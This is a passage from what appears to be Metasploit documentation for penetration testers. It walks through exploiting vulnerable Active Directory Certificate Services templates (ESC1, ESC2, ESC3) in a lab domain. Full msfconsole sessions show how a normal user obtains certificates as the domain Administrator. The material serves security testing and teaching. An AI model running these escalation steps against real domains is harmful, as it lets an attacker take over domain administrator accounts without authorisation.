<span class="zs">[*]</span>   Required Signatures: 0
<span class="zg">[+]</span>   Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>   Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zg">[+]</span>   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
<span class="zs">[*]</span>     Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-11 (Authenticated Users)
<span class="zg">[+]</span> Template: Machine
<span class="zs">[*]</span>   Distinguished Name: CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>   Manager Approval: Disabled
<span class="zs">[*]</span>   Required Signatures: 0
<span class="zg">[+]</span>   Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>   Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-515 (Domain Computers)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zg">[+]</span>   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
<span class="zs">[*]</span>     Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-11 (Authenticated Users)
<span class="zg">[+]</span> Template: ESC3-Template2
<span class="zs">[*]</span>   Distinguished Name: CN=ESC3-Template2,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>   Manager Approval: Disabled
<span class="zs">[*]</span>   Required Signatures: 0
<span class="zg">[+]</span>   Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>   Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>     * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zg">[+]</span>   Issuing CA: daforest-WIN-BR0CCBA815B-CA (WIN-BR0CCBA815B.daforest.com)
<span class="zs">[*]</span>     Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>From the output above we can determine that the SubCA certificate template is vulnerable to several attacks. However, whilst the issuing CAs allow any authenticated user to enroll in this certificate, the certificate template permissions prevent anyone but Domain Administrators and Enterprise Admins from being able to enroll in this certificate template. At that point you probably don’t need to elevate your privileges any higher, so this certificate template isn’t that useful for us.</p><p>Moving onto the next certificate template we see that ESC1-Template is vulnerable to the ESC1 attack, has permissions on the template itself that allow for enrollment by any authenticated domain user, and has one issuing CA, daforest-WIN- BR0CCBA815B-CA, available at WIN-BR0CCBA815B.daforest.com, which allows enrollment by any authenticated user. This means that any user who is authenticated to the domain can utilize this template with a ESC1 attack to elevate their privileges.</p><p>Looking at ESC2-Template we can see the same story however this time the template is vulnerable to an ESC2 attack. ESC3-Template1 is also the same but is vulnerable to ESC3_TEMPLATE_1 attacks, and ESC3-Template2 is the same but vulnerable to ESC3_TEMPLATE_2 attacks.</p><p>We also see that the User template is vulnerable to ESC3_TEMPLATE_2 attacks and the fact that it is enrollable from Domain Users and that daforest-WIN-BR0CCBA815B-CA allows enrollment in it by any authenticated user confirms the theory that this can be exploited by any authenticated attacker for an ESC3_TEMPLATE_2 attack.</p><p>Another interesting one to note is the Machine template, which allows any domain joined computer to enroll in it, and who’s issuing CA allows any authenticated user to request it.</p><p>With this we now have a list of certificates that can be utilized for privilege escalation. The next step is to use the <code class="language-plaintext highlighter-rouge">ipcr_cert</code> module to request certificates for authentication using the vulnerable certificate templates.</p><h1 id="using-the-esc1-vulnerability-to-get-a-certificate-as-the-domain-administrator"> <a href="#using-the-esc1-vulnerability-to-get-a-certificate-as-the-domain-administrator" class="anchor-heading" aria-labelledby="using-the-esc1-vulnerability-to-get-a-certificate-as-the-domain-administrator"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Using the ESC1 Vulnerability To Get a Certificate as the Domain Administrator</h1><p>Getting a certificate as the current user is great, but what we really want to do is elevate privileges if we can. Luckily we can also do this with the <code class="language-plaintext highlighter-rouge">icpr_cert</code> module. We just need to also set the <code class="language-plaintext highlighter-rouge">ALT_SID</code> and <code class="language-plaintext highlighter-rouge">ALT_UPN</code> options to specify who we would like to authenticate as instead. Note that this only works with certificate templates that are vulnerable to ESC1 due to having the <code class="language-plaintext highlighter-rouge">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag set.</p><p>If we know the domain name is <code class="language-plaintext highlighter-rouge">daforest.com</code> and the domain administrator of this domain is named <code class="language-plaintext highlighter-rouge">Administrator</code> we can quickly set this up:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA daforest-WIN-BR0CCBA815B-CA
CA =&gt; daforest-WIN-BR0CCBA815B-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC1-Template
CERT_TEMPLATE =&gt; ESC1-Template
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain DAFOREST
SMBDomain =&gt; DAFOREST
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normalpass
SMBPass =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normaluser
SMBUser =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
ALT_SID =&gt; S-1-5-21-3402587289-1488798532-3618296993-1000
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_UPN Administrator@daforest.com
ALT_UPN =&gt; Administrator@daforest.com
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) as the <code class="language-plaintext highlighter-rouge">Administrator</code> domain administrator. See the <a href="#getting-a-kerberos-ticket">Getting A Kerberos Ticket</a> section for more information.</p><h1 id="exploiting-esc2-to-gain-domain-administrator-privileges"> <a href="#exploiting-esc2-to-gain-domain-administrator-privileges" class="anchor-heading" aria-labelledby="exploiting-esc2-to-gain-domain-administrator-privileges"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC2 To Gain Domain Administrator Privileges</h1><p>From the previous enumeration efforts we know that the following certificate templates are vulnerable to ESC2:</p><ul><li>SubCA - Not exploitable as you have to be a Domain Admin or Enterprise Admin to enroll in this certificate<li>ESC2-Template - Enrollable by any authenticated user that is part of the Domain Users group, aka any authenticated domain user.</ul><p>We will use ESC2-Template to gain a TGT as the domain administrator user.</p><p>To do this we will use the <code class="language-plaintext highlighter-rouge">ipcr_cert</code> module and we will set the usual options, however we will need to run it twice. This is because with ESC2, we can’t use the vulnerability to request authentication certificates as other users without the <code class="language-plaintext highlighter-rouge">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag being set on the template. Instead what we can do is use the Any Purpose EKU or SubCA EKU that are set on these certificates to authenticate to the domain as the user who requested the certificate. So what we do is first get a ESC2 vulnerable certificate, then abuse the ability to use that certificate for any purpose to then request a certificate on behalf of another user, using that certificate as the form of authentication for this operation.</p><p>For the first run, we will set the usual <code class="language-plaintext highlighter-rouge">RHOSTS</code>, <code class="language-plaintext highlighter-rouge">CA</code>, and <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code> details, being sure to set <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code> to the vulnerable <code class="language-plaintext highlighter-rouge">ESC2-Template</code> certificate template, and supply valid SMB login credentials. This will grant us a certificate for our current user that is based off of the vulnerable <code class="language-plaintext highlighter-rouge">ESC2-Template</code>:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA daforest-WIN-BR0CCBA815B-CA
CA =&gt; daforest-WIN-BR0CCBA815B-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC2-Template
CERT_TEMPLATE =&gt; ESC2-Template
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain DAFOREST
SMBDomain =&gt; DAFOREST
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normalpass
SMBPass =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normaluser
SMBUser =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting              Required  Description
   ----           ---------------              --------  -----------
   ALT_DNS                                     no        Alternative certificate DNS
   ALT_UPN                                     no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA  yes       The target certificate authority
   CERT_TEMPLATE  ESC2-Template                yes       The certificate template
   ON_BEHALF_OF                                no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                         no        Certificate to request on behalf of
   RHOSTS         172.30.239.85                yes       The target host(s), see https://github.com/rapid7/metas
                                                         ploit-framework/wiki/Using-Metasploit
   RPORT          445                          yes       The target port (TCP)
   SMBDomain      DAFOREST                     no        The Windows domain to use for authentication
   SMBPass        normalpass                   no        The password for the specified username
   SMBUser        normaluser                   no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: normal@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> loot

Loot
====

host  service  type           name             content               info                         path
----  -------  ----           ----             -------               ----                         ----
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Next, we need to use the PFX file that we got to request another certificate to authenticate on behalf of another user. We will use the <code class="language-plaintext highlighter-rouge">PFX</code> option to specify the PFX file, and the <code class="language-plaintext highlighter-rouge">ON_BEHALF_OF</code> setting to specify the user we would like to authenticate on behalf of. Finally we will change the certificate template to another certificate template that we are able to enroll in. The default <code class="language-plaintext highlighter-rouge">User</code> certificate should work here since it allows enrollment by any authenticated domain user.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting              Required  Description
   ----           ---------------              --------  -----------
   ALT_DNS                                     no        Alternative certificate DNS
   ALT_UPN                                     no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA  yes       The target certificate authority
   CERT_TEMPLATE  ESC2-Template                yes       The certificate template
   ON_BEHALF_OF                                no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                         no        Certificate to request on behalf of
   RHOSTS         172.30.239.85                yes       The target host(s), see https://github.com/rapid7/metas
                                                         ploit-framework/wiki/Using-Metasploit
   RPORT          445                          yes       The target port (TCP)
   SMBDomain      DAFOREST                     no        The Windows domain to use for authentication
   SMBPass        normalpass                   no        The password for the specified username
   SMBUser        normaluser                   no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ON_BEHALF_OF DAFOREST\\Administrator
ON_BEHALF_OF =&gt; DAFOREST\Administrator
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set PFX /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
PFX =&gt; /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting                 Required  Description
   ----           ---------------                 --------  -----------
   ALT_DNS                                        no        Alternative certificate DNS
   ALT_UPN                                        no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA     yes       The target certificate authority
   CERT_TEMPLATE  User                            yes       The certificate template
   ON_BEHALF_OF   DAFOREST\Administrator          no        Username to request on behalf of (format: DOMAIN\USE
                                                            R)
   PFX            /home/gwillcox/.msf4/loot/2022  no        Certificate to request on behalf of
                  1216154930_default_unknown_win
                  dows.ad.cs_104207.pfx
   RHOSTS         172.30.239.85                   yes       The target host(s), see https://github.com/rapid7/me
                                                            tasploit-framework/wiki/Using-Metasploit
   RPORT          445                             yes       The target port (TCP)
   SMBDomain      DAFOREST                        no        The Windows domain to use for authentication
   SMBPass        normalpass                      no        The password for the specified username
   SMBUser        normaluser                      no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> loot

Loot
====

host  service  type           name             content               info                         path
----  -------  ----           ----             -------               ----                         ----
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) as the <code class="language-plaintext highlighter-rouge">Administrator</code> domain administrator. See the <a href="#getting-a-kerberos-ticket">Getting A Kerberos Ticket</a> section for more information.</p><h1 id="exploiting-esc3-to-gain-domain-administrator-privileges"> <a href="#exploiting-esc3-to-gain-domain-administrator-privileges" class="anchor-heading" aria-labelledby="exploiting-esc3-to-gain-domain-administrator-privileges"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC3 To Gain Domain Administrator Privileges</h1><p>To exploit ESC3 vulnerable templates we will use a similar process to <a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html#exploiting-esc2-to-gain-domain-administrator-privileges">ESC2</a> templates but with slightly different steps. First, let’s return to the earlier output where we can find several templates that are vulnerable to ESC3 attacks. However we need to split them by attack vector. The reason is that the first half of this attack needs to use the ESC3_TEMPLATE_1 vulnerable certificate templates to enroll in a certificate template that has the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) that allows one to request certificates on behalf of other principals (such as users or computers).</p><p>The second part of this attack will then require that we co-sign requests for another certificate using the certificate that we just got, to then request a certificate that can authenticate to the domain on behalf of another user. To do this we will need to look for certificates in the <code class="language-plaintext highlighter-rouge">ldap_esc_vulnerable_cert_finder</code> module which are labeled as being vulnerable to the ESC3_TEMPLATE_2 attack.</p><p>The list of ESC3_TEMPLATE_1 vulnerable templates is pretty short and consists of a single template:</p><ul><li>ESC3-TEMPLATE-1 - Vulnerable to ESC3_TEMPLATE_1 and allows enrollment via any authenticated domain user.</ul><p>ESC3_TEMPLATE_2 are more plentiful though and we can find a few that are of interest:</p><ul><li>SubCA - Again as mentioned earlier can only be enrolled in by Domain Admins and Enterprise Admins, so not a viable vector.<li>ESC3-Template2 - Enrollable via any authenticated domain user.<li>User - Enrollable via any authenticated domain user.<li>Administrator - Can only be enrolled in by Domain Admins and Enterprise Admins, so not a viable vector.<li>Machine - No real overlap between Domain Computers and Authenticated Users I don’t think?<li>DomainController - Can only be enrolled in by Domain Admins and Enterprise Admins, so not a viable vector.</ul><p>Narrowing this list down to those we can actually enroll in as users, this leaves us with <code class="language-plaintext highlighter-rouge">User</code> and <code class="language-plaintext highlighter-rouge">ESC3-Template2</code> as templates that can be used for the second part of this vulnerability.</p><p>We’ll first get the cert using <code class="language-plaintext highlighter-rouge">ipcr_cert</code> with the <code class="language-plaintext highlighter-rouge">ESC3-Template1</code> certificate.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   ALT_DNS                         no        Alternative certificate DNS
   ALT_UPN                         no        Alternative certificate UPN (format: USER@DOMAIN)
   CA                              yes       The target certificate authority
   CERT_TEMPLATE  User             yes       The certificate template
   ON_BEHALF_OF                    no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                             no        Certificate to request on behalf of
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framew
                                             ork/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        The Windows domain to use for authentication
   SMBPass                         no        The password for the specified username
   SMBUser                         no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normaluser
SMBUser =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normalpass
SMBPass =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain DAFOREST
SMBDomain =&gt; DAFOREST
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA daforest-WIN-BR0CCBA815B-CA
CA =&gt; daforest-WIN-BR0CCBA815B-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC3-Template1
CERT_TEMPLATE =&gt; ESC3-Template1
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: normal@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> loot

Loot
====

host  service  type           name             content               info                         path
----  -------  ----           ----             -------               ----                         ----
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216173718_default_unknown_windows.ad.cs_580032.pfx
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Next, we’ll try use this certificate to request another certificate on behalf of a different user. For this stage we need to specify another certificate that is vulnerable to the ESC3_TEMPLATE_2 attack vector that we are able to enroll in. We will use the <code class="language-plaintext highlighter-rouge">User</code> template for this:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
PFX =&gt; /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ON_BEHALF_OF DAFOREST\\Administrator
ON_BEHALF_OF =&gt; DAFOREST\Administrator
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting                 Required  Description
   ----           ---------------                 --------  -----------
   ALT_DNS                                        no        Alternative certificate DNS
   ALT_UPN                                        no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA     yes       The target certificate authority
   CERT_TEMPLATE  ESC3-Template1                  yes       The certificate template
   ON_BEHALF_OF   DAFOREST\Administrator          no        Username to request on behalf of (format: DOMAIN\USE
                                                            R)
   PFX            /home/gwillcox/.msf4/loot/2022  no        Certificate to request on behalf of
                  1216174221_default_unknown_win
                  dows.ad.cs_027866.pfx
   RHOSTS         172.30.239.85                   yes       The target host(s), see https://github.com/rapid7/me
                                                            tasploit-framework/wiki/Using-Metasploit
   RPORT          445                             yes       The target port (TCP)
   SMBDomain      DAFOREST                        no        The Windows domain to use for authentication
   SMBPass        normalpass                      no        The password for the specified username
   SMBUser        normaluser                      no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174559_default_unknown_windows.ad.cs_570105.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Just to show this is also possible with <code class="language-plaintext highlighter-rouge">ESC3-Template2</code> here is a snippet showing that also works:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC3-Template2
CERT_TEMPLATE =&gt; ESC3-Template2
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting                 Required  Description
   ----           ---------------                 --------  -----------
   ALT_DNS                                        no        Alternative certificate DNS
